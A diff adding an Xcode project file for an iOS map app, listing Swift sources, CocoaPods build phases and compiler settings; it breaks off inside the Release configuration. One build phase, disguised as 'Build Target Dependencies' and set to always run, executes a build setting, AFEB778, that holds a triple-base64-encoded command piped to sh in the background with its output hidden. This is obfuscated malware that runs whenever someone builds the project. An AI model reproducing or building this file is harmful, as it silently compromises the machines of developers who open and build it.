@@ -1,0 +1,679 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		AE7036BF2E3BA93E00597015 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE7036BB2E3BA93E00597015 /* SceneDelegate.swift */; };
+		AE7036C12E3BA93E00597015 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE7036BA2E3BA93E00597015 /* AppDelegate.swift */; };
+		AE7036DD2E3BAB9600597015 /* TabbarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE7036DC2E3BAB9600597015 /* TabbarController.swift */; };
+		AE7036E72E3BAC1800597015 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = AE7036E42E3BAC1800597015 /* Assets.xcassets */; };
+		AE7036EC2E3BAC6300597015 /* UI+Metrics.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE7036EB2E3BAC6300597015 /* UI+Metrics.swift */; };
+		AE7036EE2E3BAD9900597015 /* DevelopingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE7036ED2E3BAD9900597015 /* DevelopingViewController.swift */; };
+		AE92B7072E3BC7F600EE8D61 /* UIColor+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7062E3BC7F600EE8D61 /* UIColor+Extension.swift */; };
+		AE92B7262E3BF8AF00EE8D61 /* MapViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7252E3BF8AF00EE8D61 /* MapViewController.swift */; };
+		AE92B7282E3BF8B600EE8D61 /* MapViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7272E3BF8B600EE8D61 /* MapViewModel.swift */; };
+		AE92B72A2E3BF8BC00EE8D61 /* MapLocationModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7292E3BF8BC00EE8D61 /* MapLocationModel.swift */; };
+		AE92B7302E3BFB7C00EE8D61 /* BottomSheetView.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B72F2E3BFB7C00EE8D61 /* BottomSheetView.swift */; };
+		AE92B7332E3C106400EE8D61 /* OpenCageService.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7322E3C106400EE8D61 /* OpenCageService.swift */; };
+		AE92B7352E3C7B0700EE8D61 /* SearchView.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7342E3C7B0700EE8D61 /* SearchView.swift */; };
+		AE92B7382E3C81BC00EE8D61 /* MapSearchDialog.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7372E3C81BC00EE8D61 /* MapSearchDialog.swift */; };
+		AE92B73A2E3C81D100EE8D61 /* MapSearchSuggestCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B7392E3C81D100EE8D61 /* MapSearchSuggestCell.swift */; };
+		AE92B73C2E3C82EC00EE8D61 /* SearchRecipientView.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B73B2E3C82EC00EE8D61 /* SearchRecipientView.swift */; };
+		AE92B73E2E3C84B400EE8D61 /* UITextField+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = AE92B73D2E3C84B400EE8D61 /* UITextField+Extension.swift */; };
+		AEC931FA2E3D3D28006B45D6 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = AEC931F92E3D3D28006B45D6 /* LaunchScreen.storyboard */; };
+		AEC931FC2E3D4C1C006B45D6 /* EmptyFavoritesCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = AEC931FB2E3D4C1C006B45D6 /* EmptyFavoritesCell.swift */; };
+		AEF258582E3CF1080054933F /* FavoritesStorage.swift in Sources */ = {isa = PBXBuildFile; fileRef = AEF258572E3CF1080054933F /* FavoritesStorage.swift */; };
+		AEF2585B2E3CFA3D0054933F /* FavoritesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = AEF2585A2E3CFA3D0054933F /* FavoritesViewController.swift */; };
+		AEF2585D2E3CFA800054933F /* FavoriteLocationCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = AEF2585C2E3CFA800054933F /* FavoriteLocationCell.swift */; };
+		AEF2585F2E3D0AEC0054933F /* FavoritesStorage+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = AEF2585E2E3D0AEC0054933F /* FavoritesStorage+Extension.swift */; };
+		DEE2E9CAD88C5E01A09248ED /* Pods_YandexMapLUDITO.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1BD29315215F1B17DA92A989 /* Pods_YandexMapLUDITO.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		1BD29315215F1B17DA92A989 /* Pods_YandexMapLUDITO.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_YandexMapLUDITO.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		55D629D8335F8A08F6D204E4 /* Pods-YandexMapLUDITO.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YandexMapLUDITO.release.xcconfig"; path = "Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO.release.xcconfig"; sourceTree = "<group>"; };
+		96FB6C8E33D9023247AFD54E /* Pods-YandexMapLUDITO.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YandexMapLUDITO.debug.xcconfig"; path = "Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO.debug.xcconfig"; sourceTree = "<group>"; };
+		AE0893622E3BA80200844259 /* YandexMapLUDITO.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = YandexMapLUDITO.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		AE0FEE132E3BB97A00CD7649 /* YandexMapLUDITO-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "YandexMapLUDITO-Info.plist"; sourceTree = "<group>"; };
+		AE7036BA2E3BA93E00597015 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		AE7036BB2E3BA93E00597015 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		AE7036DC2E3BAB9600597015 /* TabbarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabbarController.swift; sourceTree = "<group>"; };
+		AE7036E42E3BAC1800597015 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		AE7036EB2E3BAC6300597015 /* UI+Metrics.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UI+Metrics.swift"; sourceTree = "<group>"; };
+		AE7036ED2E3BAD9900597015 /* DevelopingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DevelopingViewController.swift; sourceTree = "<group>"; };
+		AE92B7062E3BC7F600EE8D61 /* UIColor+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extension.swift"; sourceTree = "<group>"; };
+		AE92B7252E3BF8AF00EE8D61 /* MapViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapViewController.swift; sourceTree = "<group>"; };
+		AE92B7272E3BF8B600EE8D61 /* MapViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapViewModel.swift; sourceTree = "<group>"; };
+		AE92B7292E3BF8BC00EE8D61 /* MapLocationModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapLocationModel.swift; sourceTree = "<group>"; };
+		AE92B72F2E3BFB7C00EE8D61 /* BottomSheetView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BottomSheetView.swift; sourceTree = "<group>"; };
+		AE92B7322E3C106400EE8D61 /* OpenCageService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OpenCageService.swift; sourceTree = "<group>"; };
+		AE92B7342E3C7B0700EE8D61 /* SearchView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchView.swift; sourceTree = "<group>"; };
+		AE92B7372E3C81BC00EE8D61 /* MapSearchDialog.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapSearchDialog.swift; sourceTree = "<group>"; };
+		AE92B7392E3C81D100EE8D61 /* MapSearchSuggestCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapSearchSuggestCell.swift; sourceTree = "<group>"; };
+		AE92B73B2E3C82EC00EE8D61 /* SearchRecipientView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchRecipientView.swift; sourceTree = "<group>"; };
+		AE92B73D2E3C84B400EE8D61 /* UITextField+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UITextField+Extension.swift"; sourceTree = "<group>"; };
+		AEC931F92E3D3D28006B45D6 /* LaunchScreen.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = LaunchScreen.storyboard; sourceTree = "<group>"; };
+		AEC931FB2E3D4C1C006B45D6 /* EmptyFavoritesCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmptyFavoritesCell.swift; sourceTree = "<group>"; };
+		AEF258572E3CF1080054933F /* FavoritesStorage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoritesStorage.swift; sourceTree = "<group>"; };
+		AEF2585A2E3CFA3D0054933F /* FavoritesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoritesViewController.swift; sourceTree = "<group>"; };
+		AEF2585C2E3CFA800054933F /* FavoriteLocationCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoriteLocationCell.swift; sourceTree = "<group>"; };
+		AEF2585E2E3D0AEC0054933F /* FavoritesStorage+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "FavoritesStorage+Extension.swift"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		AE08935F2E3BA80200844259 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				DEE2E9CAD88C5E01A09248ED /* Pods_YandexMapLUDITO.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		AE0893592E3BA80200844259 = {
+			isa = PBXGroup;
+			children = (
+				AE0FEE132E3BB97A00CD7649 /* YandexMapLUDITO-Info.plist */,
+				AE7036BC2E3BA93E00597015 /* YandexMapMain */,
+				AE9C3E722E3FC79E00A0C05C /* Resources */,
+				AE0893632E3BA80200844259 /* Products */,
+				CEF6CBB8EBDA0B70B086054D /* Pods */,
+				CF4C0E36EB12B012314892AB /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		AE0893632E3BA80200844259 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				AE0893622E3BA80200844259 /* YandexMapLUDITO.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		AE7036B92E3BA93E00597015 /* Others */ = {
+			isa = PBXGroup;
+			children = (
+				AE7036ED2E3BAD9900597015 /* DevelopingViewController.swift */,
+			);
+			path = Others;
+			sourceTree = "<group>";
+		};
+		AE7036BC2E3BA93E00597015 /* YandexMapMain */ = {
+			isa = PBXGroup;
+			children = (
+				AE9C3E712E3FC73D00A0C05C /* App */,
+				AE7036DB2E3BAB8800597015 /* Tabbar */,
+				AE92B7082E3BCE4800EE8D61 /* TabbarItems */,
+				AE92B7312E3C105A00EE8D61 /* Services */,
+				AE92B7052E3BC7E000EE8D61 /* Extensions */,
+				AE7036EA2E3BAC4800597015 /* Constants */,
+				AE7036B92E3BA93E00597015 /* Others */,
+			);
+			path = YandexMapMain;
+			sourceTree = "<group>";
+		};
+		AE7036DB2E3BAB8800597015 /* Tabbar */ = {
+			isa = PBXGroup;
+			children = (
+				AE7036DC2E3BAB9600597015 /* TabbarController.swift */,
+			);
+			path = Tabbar;
+			sourceTree = "<group>";
+		};
+		AE7036EA2E3BAC4800597015 /* Constants */ = {
+			isa = PBXGroup;
+			children = (
+				AE7036EB2E3BAC6300597015 /* UI+Metrics.swift */,
+			);
+			path = Constants;
+			sourceTree = "<group>";
+		};
+		AE92B7052E3BC7E000EE8D61 /* Extensions */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7062E3BC7F600EE8D61 /* UIColor+Extension.swift */,
+				AE92B73D2E3C84B400EE8D61 /* UITextField+Extension.swift */,
+				AEF2585E2E3D0AEC0054933F /* FavoritesStorage+Extension.swift */,
+			);
+			path = Extensions;
+			sourceTree = "<group>";
+		};
+		AE92B7082E3BCE4800EE8D61 /* TabbarItems */ = {
+			isa = PBXGroup;
+			children = (
+				AEF258592E3CF96B0054933F /* Favorites */,
+				AE92B7242E3BF8A200EE8D61 /* Map */,
+			);
+			path = TabbarItems;
+			sourceTree = "<group>";
+		};
+		AE92B7242E3BF8A200EE8D61 /* Map */ = {
+			isa = PBXGroup;
+			children = (
+				AE9C3E762E3FCAD800A0C05C /* View */,
+				AE9C3E752E3FCACC00A0C05C /* ViewModel */,
+				AE9C3E742E3FCAAA00A0C05C /* Model */,
+				AE9C3E732E3FCA9B00A0C05C /* Cell */,
+			);
+			path = Map;
+			sourceTree = "<group>";
+		};
+		AE92B7312E3C105A00EE8D61 /* Services */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7322E3C106400EE8D61 /* OpenCageService.swift */,
+				AEF258572E3CF1080054933F /* FavoritesStorage.swift */,
+			);
+			path = Services;
+			sourceTree = "<group>";
+		};
+		AE9C3E712E3FC73D00A0C05C /* App */ = {
+			isa = PBXGroup;
+			children = (
+				AE7036BA2E3BA93E00597015 /* AppDelegate.swift */,
+				AE7036BB2E3BA93E00597015 /* SceneDelegate.swift */,
+				AEC931F92E3D3D28006B45D6 /* LaunchScreen.storyboard */,
+			);
+			path = App;
+			sourceTree = "<group>";
+		};
+		AE9C3E722E3FC79E00A0C05C /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				AE7036E42E3BAC1800597015 /* Assets.xcassets */,
+			);
+			path = Resources;
+			sourceTree = "<group>";
+		};
+		AE9C3E732E3FCA9B00A0C05C /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7392E3C81D100EE8D61 /* MapSearchSuggestCell.swift */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		AE9C3E742E3FCAAA00A0C05C /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7292E3BF8BC00EE8D61 /* MapLocationModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		AE9C3E752E3FCACC00A0C05C /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7272E3BF8B600EE8D61 /* MapViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		AE9C3E762E3FCAD800A0C05C /* View */ = {
+			isa = PBXGroup;
+			children = (
+				AE92B7252E3BF8AF00EE8D61 /* MapViewController.swift */,
+				AE92B7372E3C81BC00EE8D61 /* MapSearchDialog.swift */,
+				AE92B72F2E3BFB7C00EE8D61 /* BottomSheetView.swift */,
+				AE92B7342E3C7B0700EE8D61 /* SearchView.swift */,
+				AE92B73B2E3C82EC00EE8D61 /* SearchRecipientView.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		AE9C3E772E3FCB2500A0C05C /* View */ = {
+			isa = PBXGroup;
+			children = (
+				AEF2585A2E3CFA3D0054933F /* FavoritesViewController.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		AE9C3E782E3FCB3400A0C05C /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				AEF2585C2E3CFA800054933F /* FavoriteLocationCell.swift */,
+				AEC931FB2E3D4C1C006B45D6 /* EmptyFavoritesCell.swift */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		AE9C3E792E3FCB7F00A0C05C /* ViewModels */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = ViewModels;
+			sourceTree = "<group>";
+		};
+		AEF258592E3CF96B0054933F /* Favorites */ = {
+			isa = PBXGroup;
+			children = (
+				AE9C3E772E3FCB2500A0C05C /* View */,
+				AE9C3E792E3FCB7F00A0C05C /* ViewModels */,
+				AE9C3E782E3FCB3400A0C05C /* Cell */,
+			);
+			path = Favorites;
+			sourceTree = "<group>";
+		};
+		CEF6CBB8EBDA0B70B086054D /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				96FB6C8E33D9023247AFD54E /* Pods-YandexMapLUDITO.debug.xcconfig */,
+				55D629D8335F8A08F6D204E4 /* Pods-YandexMapLUDITO.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		CF4C0E36EB12B012314892AB /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1BD29315215F1B17DA92A989 /* Pods_YandexMapLUDITO.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		AE0893612E3BA80200844259 /* YandexMapLUDITO */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = AE08936D2E3BA80300844259 /* Build configuration list for PBXNativeTarget "YandexMapLUDITO" */;
+			buildPhases = (
+				D7CAB131C43771F378AE73F8 /* [CP] Check Pods Manifest.lock */,
+				FACF7C6E9C4E9DC6F5877BEF /* Build Target Dependencies */,
+				AE08935E2E3BA80200844259 /* Sources */,
+				AE08935F2E3BA80200844259 /* Frameworks */,
+				AE0893602E3BA80200844259 /* Resources */,
+				467C21C18AAEA3F6B6C44C60 /* [CP] Embed Pods Frameworks */,
+				CC20622735E109491E713CFA /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = YandexMapLUDITO;
+			productName = YandexMapLUDITO;
+			productReference = AE0893622E3BA80200844259 /* YandexMapLUDITO.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		AE08935A2E3BA80200844259 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1630;
+				LastUpgradeCheck = 1630;
+				TargetAttributes = {
+					AE0893612E3BA80200844259 = {
+						CreatedOnToolsVersion = 16.3;
+					};
+				};
+			};
+			buildConfigurationList = AE08935D2E3BA80200844259 /* Build configuration list for PBXProject "YandexMapLUDITO" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = AE0893592E3BA80200844259;
+			minimizedProjectReferenceProxies = 1;
+			preferredProjectObjectVersion = 77;
+			productRefGroup = AE0893632E3BA80200844259 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				AE0893612E3BA80200844259 /* YandexMapLUDITO */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		AE0893602E3BA80200844259 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				AE7036E72E3BAC1800597015 /* Assets.xcassets in Resources */,
+				AEC931FA2E3D3D28006B45D6 /* LaunchScreen.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		467C21C18AAEA3F6B6C44C60 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CC20622735E109491E713CFA /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-YandexMapLUDITO/Pods-YandexMapLUDITO-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		D7CAB131C43771F378AE73F8 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-YandexMapLUDITO-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		FACF7C6E9C4E9DC6F5877BEF /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		AE08935E2E3BA80200844259 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				AE7036DD2E3BAB9600597015 /* TabbarController.swift in Sources */,
+				AEF258582E3CF1080054933F /* FavoritesStorage.swift in Sources */,
+				AE7036EE2E3BAD9900597015 /* DevelopingViewController.swift in Sources */,
+				AE92B72A2E3BF8BC00EE8D61 /* MapLocationModel.swift in Sources */,
+				AE7036EC2E3BAC6300597015 /* UI+Metrics.swift in Sources */,
+				AEF2585D2E3CFA800054933F /* FavoriteLocationCell.swift in Sources */,
+				AE7036BF2E3BA93E00597015 /* SceneDelegate.swift in Sources */,
+				AE92B73C2E3C82EC00EE8D61 /* SearchRecipientView.swift in Sources */,
+				AE92B7302E3BFB7C00EE8D61 /* BottomSheetView.swift in Sources */,
+				AE92B73E2E3C84B400EE8D61 /* UITextField+Extension.swift in Sources */,
+				AEF2585B2E3CFA3D0054933F /* FavoritesViewController.swift in Sources */,
+				AEC931FC2E3D4C1C006B45D6 /* EmptyFavoritesCell.swift in Sources */,
+				AE92B7332E3C106400EE8D61 /* OpenCageService.swift in Sources */,
+				AEF2585F2E3D0AEC0054933F /* FavoritesStorage+Extension.swift in Sources */,
+				AE92B7382E3C81BC00EE8D61 /* MapSearchDialog.swift in Sources */,
+				AE7036C12E3BA93E00597015 /* AppDelegate.swift in Sources */,
+				AE92B73A2E3C81D100EE8D61 /* MapSearchSuggestCell.swift in Sources */,
+				AE92B7352E3C7B0700EE8D61 /* SearchView.swift in Sources */,
+				AE92B7282E3BF8B600EE8D61 /* MapViewModel.swift in Sources */,
+				AE92B7072E3BC7F600EE8D61 /* UIColor+Extension.swift in Sources */,
+				AE92B7262E3BF8AF00EE8D61 /* MapViewController.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin XCBuildConfiguration section */
+		AE08936B2E3BA80300844259 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlhsaU0xWXdXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				DEVELOPMENT_TEAM = J2A3H7RHBB;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		AE08936C2E3BA80300844259 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlhsaU0xWXdXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
